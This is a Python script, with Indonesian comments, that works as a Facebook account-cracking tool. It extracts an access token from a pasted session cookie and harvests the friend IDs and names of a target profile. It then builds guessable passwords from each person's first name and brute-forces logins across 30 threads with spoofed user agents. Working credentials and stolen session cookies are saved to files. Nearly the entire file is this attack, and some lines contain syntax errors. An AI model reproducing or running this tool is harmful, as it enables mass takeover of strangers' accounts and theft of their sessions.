# SC FREE JANGAN DIPERJUAL BELIKAN
# MAU OPREK SILAHKAN 
# NAMA : AT_GANTENG IYA KAN :)
# MAKASIH
#<----------[ MODULE ]---------->#
import requests,json,os,sys,random,datetime,time,re,platform,bs4,rich,stdiomask
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich.console import Console as sol
from rich.markdown import Markdown as mark
#<----------[ MEMEK ]---------->#
id,id1,uid,uid1 = [],[],[],[]
kentod,kentid = [],[]
loop,ok,cp = 0,0,0
pwkon, pwnya = [],[]
tokenmek = []
at,at2 = [],[]
ses = requests.Session()
rr = random.randint
rc = random.choice
#<----------[ USER AGENT ]---------->#
def AteUgen():
	ipong = rc(["6_1","7_1_2","8_3","12_4_5","13_3_1","15_1"])
	ipong2 = rc(["13_6_1","14_0_1","14_1","14_2","14_3","14_4","15_5","16_3_1","16_5","16_6","16_6_1","16_7_2","17_0_2","17_0_3","17_1","17_1_1","17_1_2","17_2_1","17_3","17_4"])
	Za = rc(["en-HK","en-US","es-MX","ru-RU","de-DE","ru-MD"])
	Ze = rc(["19B74","11D257","16G161","17D50","12F70"])
	ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ipong} like Mac OS X;{Za}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,20))}.{str(rr(2,10))}.{str(rr(1,9))} Mobile/{Ze} Safari/537.36 Puffin/{str(rr(1,8))}.{str(rr(0,9))}.{str(rr(0,9))}IP"
	ua0 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ipong2} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ipong2} Mobile/15E148 Safari/604.1 (Ecosia ios@{str(rr(1,9))}.{str(rr(0,5))}.{str(rr(1,9))}.{str(rr(50,1500))})"
	return rc([ua,ua0])
#<----------[ WARNA ]---------->#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
mahal = random.choice([P,M,K,H,B,U])
#<----------[ BULAN ]---------->#
rb = {'1':'JANUARI','2':'FEBRUARI','3':'MARET','4':'APRIL','5':'MEI','6':'JUNI','7':'JULI','8':'AGUSTUS','9':'SEPTEMBER','10':'OKTOBER','11':'NOVEMBER','12':'DESEMBER'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
oke = 'AT-LIVE-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cpe = 'AT-CHEK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
#<----------[ UCAPAN MANIS ]---------->#
hour = datetime.datetime.now().hour
if 19 <= hour < 4:
  at2 = f"SELAMAT MALAM"
elif 4 <= hour < 12:
  at2 = f"SELAMAT PAGI"
elif 12 <= hour < 15:
  at2 = "SELAMAT SIANG"
elif 15 <= hour < 18:
  at2 = f"SELAMAT SORE"
elif 18 <= hour < 19:
  at2 = f"SELAMAT MALAM"
else:
  at2 = f"SELAMAT MALAM"
#<----------[ ANIMASI ]---------->#
def at(berjalan):
        for gasle in berjalan + "\n":sys.stdout.write(gasle);sys.stdout.flush();time.sleep(0.05)
def at(berjalan):
        for gasle in berjalan + "\n":sys.stdout.write(gasle);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	menu(id)
#<----------[ BANNER ]---------->#
def AteLOGO():
	os.system('clear')
	print(f'''⠀⠀⠀⠀⠀⠀⠀⣠⣠⣶⣿⣷⣿⣿⣿⣷⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣾⣿⢿⣻⡽⣞⣳⡽⠚⠉⠉⠙⠛⢿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⢻⣟⣧⢿⣻⢿⠀⠀⠀⠀⠀⠀⠀⠻⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣾⣿⡿⠞⠛⠚⠫⣟⡿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⡟⠀⠀⠀⠀⠀⠈⢻⡽⣆⠀⠀⣴⣷⡄⠀⠀⠀⠘⣿⡆⠀⠀⣀⣠⣤⡄
⠀⠀⣿⣿⠁⠀⠀⠀⠀⠀⠀⠈⣿⠿⢷⡀⠘⠛⠃⠀⠠⠀⠀⣿⣅⣴⡶⠟⠋⢹⣿
⠀⠀⢻⣿⡀⠀⠀⠀⢾⣿⡆⠀⢿⣴⣴⡇⠀⠀⠀⠀⠀⠀⢠⡟⠋⠁⠀⠀⠀⢸⣿
⠀⠀⠈⢿⣇⠀⠀⠀⠈⠉⠥⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⣾⡏
⠀⠀⠀⠈⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠸⠁⠀⠀⠀⠀⠀⣼⡟⠀
⠀⠀⠀⠀⠀⣹⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠁⠀⠐⢧⡀⠀⢀⣾⠟⠀⠀
⠀⠀⢀⣰⣾⠟⠉⠀⠀⠉⠉⠀⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣶⡟⠋⠀⠀⠀
⣠⣶⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⣿⡆⠀⠀⠀⠀
⢻⣧⣄⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀
⠀⠉⠛⠿⣷⣶⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣾⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣷⣦⡀⠀⢀⣀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣷⠀      SECE SIMPEL
⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⣿⣿⣿⠿⠟⠁   VERSION UPDATE : {mahal}2024
{P}''')
#<--------------[ DEF-LOGIN ]-------------->#
def login_at():
	try:
		token = open('.plntok.txt','r').read()
		cok = open('.plncok.txt','r').read()
		tokenmek.append(token)
		try:
			attt1 = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenmek[0], cookies={'cookie':cok})
			attt2 = json.loads(attt1.text)['name']
			attt3 = json.loads(attt1.text)['id']
			menu(attt3)
		except KeyError:
			login_at1()
		except requests.exceptions.ConnectionError:
			li = f' {B}══➤{P} TIDAK ADA KONEKSI INTERNET, CEK INTERNET ANDA DAN JALANIN ULANG SCNYA'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_at1()
#<--------------[ DEF-LOGIN-LAGI ]-------------->#
def login_at1():
	try:
		os.system('clear')
		AteLOGO()
		print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
		cok_mek = input(f' {M}[{K}${M}]{P}. MASUKAN PERAWAN :{M} ')
		conver = gatot(cok_mek)
		print(f' {M}[{K}${M}]{P}. TOKEN : {M}{conver} ')
		at(f' {B}══➤{P} LOGIN SUKSES MEK ')
		tokennew = open(".plntok.txt", "w").write(conver)
		cokienew = open(".plncok.txt", "w").write(cok_mek)
		
	except Exception as e:
		os.system("rm -f .plntok.txt")
		os.system("rm -f .plntok.txt")
		at(f' {B}══➤{P} LOGIN GAGAL GANTI TUMBAL LU MEK !!')
		time.sleep(5)
		print(e)
		login_at()

def gatot(cok):
		at_gans = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies={'cookie':cok},allow_redirects=True).text
		at_gans1 = re.search('window\.location\.replace\("(.*?)"\)',str(at_gans)).group(1).replace('\\','')
		at_gans2 = ses.get(at_gans1,cookies={'cookie':cok},allow_redirects=True).text
		at_gans3  = re.search('accessToken="(.*?)"',str(at_gans2)).group(1)
		return(at_gans3)
#<----------[ DEF-MENU ]---------->#
def menu(id):
	try:
		token = open('.plntok.txt','r').read()
		cok = open('.plncok.txt','r').read()
	except IOError:
		at(f' {B}══➤{P} TUMBALU MOKAD MEK ')
		waktu(2)
		login_at()
	os.system('clear')
	AteLOGO()
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' ══➤ STATUS : {mahal}FREE{P} ')
	print(f' ══➤ NAMA   : {mahal}AT_GANTENG{P} ')
	print(f' ══➤ {mahal}{at2} KANG COLI {P}:) ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' ══➤ {mahal}JANGAN TERLALU BERHARAP YG TIDAK PASTI {P}:( ')
	print(f' ══➤ {mahal}SEMOGA HARI² MU MENYENANGKAN SAYANG {P}:v ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' {M}[{H}1{M}]{P}. CRACK PUBLIK		{M}[{H}0{M}]{P}. GANTI PERAWAN ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	AT = input(f' {M}[{K}${M}]{P}. PILIH COK 1/0 : ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	if AT in ['1','1']:
		idt = input(f' {M}[{K}${M}]{P}. MASUKAN ID PUBLIK : ')
		dump(idt,"",{"cookie":cok},token)
		print('')
		Ate_setting()
	elif AT in ['exit','0','logout']:
		hapus_prawan = os.system('rm -rf .plntok.txt && rm -f .plncok.txt')
		at(f' {B}══➤{P} SUKSES JEBOL PERAWAN')
		time.sleep(5)
		login_at()
	else:
		at(f" {B}══➤{P} MASUKAN HANYA ANGKA COK")
		waktu(2)
		back()
#<----------[ DEF-PUBLIK ]---------->#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r {M}[{K}${M}]{P}. TOTAL ID TERKUMPUL : {len(id)}{P} "),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#<----------[ DEF-THN-RANDOM ]---------->#
def Ate_setting():
	for at_ganteng in id:
			att = random.randint(0,len(id1))
			id1.insert(att,at_ganteng)
	At_metod()
#<----------[ DEF-METHOD ]---------->#
def At_metod():
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' {M}[{H}1{M}]{P}. VALID			{M}[{H}2{M}]{P}. ASYNC ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	ganteng_ = input(f' {M}[{K}${M}]{P}. PILIH COK 1/2 : ')
	if ganteng_ in ['01','1']:
		kentod.append('valid')
	elif ganteng_ in ['02','2']:
		kentod.append('async')
	else:
		at(f" {B}══➤{P} MASUKAN HANYA ANGKA COK")
		waktu(2)
		At_metod()
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	passs = input(f' {M}[{K}${M}]{P}. TAMBAHKAN PW MANUAL Y/t : ')
	if passs in ['y','Y']:
		pwkon.append('ya')
		paskon = input(f' {M}[{K}${M}]{P}. MASUKAN PW MANUAL :  ')
		paslon = paskon.split(',')
		for _pw_ in paslon:
			pwnya.append(_pw_)
	else:
		pwkon.append('tidak')
		Te_pass()
#<----------[ DEF-WONDERLIST ]---------->#
def Te_pass():
	global prog,des,AteGanteng,GantengPoll
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f""" {M}[{K}${M}]{P}. HASIL LIVE DI = {H}{oke}{P}\n {M}[{K}${M}]{P}. HASIL CHEK DI = {K}{cpe}{P}\n {M}[{K}${M}]{P}. MAINKAN MEMEK PERAWAN SETIAP 300 COLMEKAN """)
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	AteGanteng = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	GantengPoll = AteGanteng.add_task('',total=len(id))
	with AteGanteng:
		with tred(max_workers=30) as plongo:
			for mustika in id1:
				uid,nama = mustika.split('|')[0],mustika.split('|')[1].lower()
				depan = nama.split(' ')[0]
				pasat = []
				if len(nama)<6:
					if len(depan)<3:
						pass
					else:
						pasat.append(nama)
						pasat.append(depan+'123')
						pasat.append(depan+'1234')
						pasat.append(depan+'12345')
						pasat.append(depan+'123456')
						pasat.append(depan+'321')
						pasat.append(depan+'01')
						pasat.append(depan+'09')
						pasat.append(depan+'03')
				else:
					if len(depan)<3:
						pasat.append(nama)
					else:
						pasat.append(nama)
						pasat.append(depan+'123')
						pasat.append(depan+'1234')
						pasat.append(depan+'12345')
						pasat.append(depan+'123456')
						pasat.append(depan+'321')
						pasat.append(depan'01')
						pasat.append(depan'09')
						pasat.append(depan'03')
				if 'at' in pwkon:
					for pwde in pwnya:
						pasat.append(pwde)
				else:pass
				if 'valid' in kentod:
					plongo.submit(validate,uid,pasat)
				elif 'async' in kentod:
					plongo.submit(asyncc,uid,pasat)
				else:
					plongo.submit(validate,uid,pasat)
		print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
		print(f" {M}[{K}${M}]{P}. SUKSES CRACK {B}{len(id1)}{P} ID,DENGAN JUMPLAH HASIL\n {M}[{K}${M}]{P}. AT-LIVE = {H}{ok} \n {M}[{K}${M}]{P}. AT-CHEK = {K}{cp}{P}")
		print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
#<----------[ DEF-VALIDATE ]---------->#
def validate(uid,pasat):
	global loop,ok,cp
	AteGanteng.update(GantengPoll,description=f' [TEGAR] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHEK = [yellow]{(cp)}[white]]')
	AteGanteng.advance(GantengPoll)
	ua = AteUgen()
	ses = requests.Session()
	for pw in pasat:
		try:
			p = ses.get('https://m.prod.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa = ({
			"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"uid":uid,
			"next": "https://m.prod.facebook.com/v5.0/dialog/oauth?app_id=285562428300787&cbt=1709452496918&channel_url=https://staticxx.facebook.com-x-connect&xd_arbiter/version=4623&cb=fe2e12d59af8fed29&domain=www.jamtangan.com&is_canvas/false&origin=https://www.jamtangan.com-f8a7fd5c976607552&relation/opener&client_id=285562428300787&display/touch&domain=www.jamtangan.com-e2e-fallback_redirect_uri=https://www.jamtangan.com&login/locale&en_US/logger_id=f48b37a2e1119e20c&origin=2&redirect_uri=https://staticxx.facebook.com-x-connect&xd_arbiter/version=4623&cb=ff857ee30a26b211a&domain=www.jamtangan.com&is_canvas/false&origin=https://www.jamtangan.com-f8a7fd5c976607552&relation/opener&frame=fb4ebd097bc939579&response_type/token&signed_request/graph_domain&return_scopes/true&scope/email&public_profile/sdk/joey&version=v5.0&ret/login&fbapp_pres=0&tp/unspecified",
			"flow":"login_no_pin",
			"pass":pw,
			})
			koki_kon = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			heade=({
			'Host': 'm.prod.facebook.com',
			'content-length': f"{len(str(dataa))}",
			'cache-control': 'max-age=0',
			'dpr': f'{str(rr(1,10))}',
			'viewport-width': f'{str(rr(99,999))}',
			'sec-ch-ua': f'"Not_A Brand";v="{str(rr(1,99))}", "Chromium";v="{str(rr(10,120))}"',
			'sec-ch-ua-mobile': f'?{str(rr(0,1))}',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': f'"{str(rr(1,25))}.0.0"',
			'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(1,99))}.0.0.0", "Chromium";v="{str(rr(10,120))}.0.{str(rr(1000,10000))}.{str(rr(10,270))}"',
			'sec-ch-prefers-color-scheme': 'dark',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.prod.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'referer': 'https://m.prod.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			})
			po = ses.post("https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", data=dataa,headers=heade,cookies={'cookie': koki_kon},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r ══➤ {K}{uid}|{pw}    {P}')
				open('/sdcard/AT-CHEK/'+cpe,'a').write(uid+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r ══➤ {H}{uid}|{pw}    {P}')
				print(f' ══➤{U}{kuki} {P}')
				open('/sdcard/AT-LIVE/'+oke,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#<----------[ DEF-ASYNC ]---------->#
def asyncc(uid,pasat):
	global loop,ok,cp
	AteGanteng.update(GantengPoll,description=f' [TEGAR] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHEK = [yellow]{(cp)}[white]]')
	AteGanteng.advance(GantengPoll)
	ua = AteUgen()
	ses = requests.Session()
	for pw in pasat:
		try:
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
			'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),
			'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
			'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1),
			'try_number': '0',
			'unrecognized_tries': '0',
			'email': uid,
			'pass': pw,
			'prefill_contact_point': '',
			'prefill_source': '',
			'prefill_type': '',
			'first_prefill_source': '',
			'first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'false',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)
			}
			koki_kon = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": 'https://m.facebook.com/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,headers=heade,cookies={'cookie': koki_kon},allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r ══➤ {K}{uid}|{pw}    {P}')
				open('/sdcard/AT-CHEK/'+cpe,'a').write(uid+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r ══➤ {H}{uid}|{pw}    {P}')
				print(f' ══➤{U}{kuki} {P}')
				open('/sdcard/AT-LIVE/'+oke,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
				
